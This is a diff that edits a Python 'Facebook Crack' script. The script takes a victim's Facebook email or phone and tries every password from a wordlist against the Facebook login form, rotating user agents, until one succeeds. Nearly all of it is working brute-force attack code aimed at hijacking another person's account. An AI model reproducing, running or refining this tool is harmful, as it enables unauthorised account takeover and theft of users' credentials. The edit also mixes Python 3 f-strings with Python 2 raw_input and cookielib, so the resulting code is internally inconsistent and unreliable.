@@ -6,9 +6,6 @@ import mechanize
 import cookielib
 import random
 
-
-
-
 email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
 
 
@@ -34,10 +31,8 @@ def main():
 	search()
 	print("Password does not exist in the wordlist")
 
-	
-	
 def brute(password):
-	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
+	sys.stdout.write(f"\r[*] Trying ..... {password}\n")
 	sys.stdout.flush()
 	br.addheaders = [('User-agent', random.choice(useragents))]
 	site = br.open(login)
@@ -47,11 +42,11 @@ def brute(password):
 	sub = br.submit()
 	log = sub.geturl()
 	if log != login and (not 'login_attempt' in log):
-			print("\n\n[+] Password Find = {}".format(password))
+			print(f"\n\n[+] Password Find = {password}")
 			raw_input("ANY KEY to Exit....")
 			sys.exit(1)
 
-			
+
 def search():
 	global password
 	passwords = open(passwordlist,"r")
@@ -59,15 +54,13 @@ def search():
 		password = password.replace("\n","")
 		brute(password)
 
-		
-#welcome 
 def welcome():
 	wel = """
 
         +=========================================+
         |..........   Facebook Crack   ...........|
         +-----------------------------------------+
-        |            #Author: Ha3MrX              | 
+        |            #Author: Ha3MrX              |
         |	       Version 1.0                |
  	|   https://www.youtube.com/c/HA-MRX      |
         +=========================================+
@@ -76,13 +69,11 @@ def welcome():
 """
 	total = open(passwordlist,"r")
 	total = total.readlines()
-	print wel 
-	print " [*] Account to crack : {}".format(email)
-	print " [*] Loaded :" , len(total), "passwords"
-	print " [*] Cracking, please wait ...\n\n"
+	print(wel)
+	print(f" [*] Account to crack : {email}")
+	print(" [*] Loaded :" , len(total), "passwords")
+	print(" [*] Cracking, please wait ...\n\n")
 
-	
+
 if __name__ == '__main__':
 	main()
-
-
